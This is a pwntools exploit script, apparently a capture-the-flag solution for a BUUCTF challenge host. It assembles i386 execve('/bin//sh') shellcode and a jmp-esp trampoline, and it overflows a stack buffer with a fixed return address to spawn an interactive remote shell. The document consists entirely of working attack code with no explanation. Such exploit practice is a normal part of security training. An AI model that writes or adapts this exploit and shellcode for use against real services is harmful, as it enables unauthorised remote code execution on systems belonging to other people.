from pwn import *

context(log_level='debug',os='linux',arch='i386')

p=remote('node5.buuoj.cn',27397)

shellcode="""
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xb
int 0x80    
"""

jmpshellcode="""
sub esp,40;
jmp esp
"""

shellcode=asm(shellcode)
jmpshellcode=asm(jmpshellcode)

payload=shellcode.ljust(0x24,b'a')+p32(0x8048554)+jmpshellcode

p.recvuntil(b'>')

p.sendline(payload)

p.interactive()
